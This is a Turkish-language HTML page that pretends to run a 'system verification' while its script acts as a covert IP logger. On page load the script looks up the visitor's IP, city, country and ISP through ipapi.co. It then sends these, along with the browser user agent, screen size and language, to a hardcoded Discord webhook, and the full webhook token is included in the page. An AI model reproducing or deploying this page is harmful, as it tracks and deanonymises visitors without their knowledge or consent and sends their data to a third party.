<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Doğrulanıyor</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #status { padding: 20px; border-radius: 8px; background: #1e1e1e; border: 1px solid #333; }
    </style>
</head>
<body>

<div id="status">Sistem kontrol ediliyor, lütfen bekleyin...</div>

<script>
    async function verileriGonder() {
        const statusDiv = document.getElementById('status');
        const webhookURL = "https://discord.com/api/webhooks/1493628722509516831/XhAi0phMoB8AsMpavoE80yOZ4TZ-orNAiMfHOZuwtSNoC2XSBFX_45WLYnkwSYonzVni";

        try {
            // 1. IP ve Detaylı Bilgileri Al
            const ipRes = await fetch('https://ipapi.co/json/');
            const d = await ipRes.json();

            // 2. Mesaj İçeriğini Hazırla
            const payload = {
                username: "Ziyaretçi Takip Sistemi",
                avatar_url: "https://i.imgur.com/4M34hi2.png",
                embeds: [{
                    title: "✅ Yeni Bağlantı Kuruldu",
                    color: 3066993,
                    fields: [
                        { name: "🌐 IP Adresi", value: `\`${d.ip}\``, inline: true },
                        { name: "📍 Şehir/Ülke", value: `${d.city} / ${d.country_name}`, inline: true },
                        { name: "🏢 Sağlayıcı", value: d.org, inline: false },
                        { name: "📱 Cihaz Bilgisi", value: navigator.userAgent },
                        { name: "🖥️ Çözünürlük", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                        { name: "🌍 Dil", value: navigator.language, inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            // 3. Discord'a Gönder
            const response = await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                statusDiv.innerHTML = "✅ Bilgiler başarıyla aktarıldı.";
                statusDiv.style.color = "#2ecc71";
            } else {
                statusDiv.innerHTML = "❌ Discord hatası: " + response.status;
                statusDiv.style.color = "#e74c3c";
            }

        } catch (error) {
            statusDiv.innerHTML = "⚠️ Hata: Veri çekilemedi veya engellendi.";
            console.error(error);
        }
    }

    // Çalıştır
    verileriGonder();
</script>

</body>
</html>
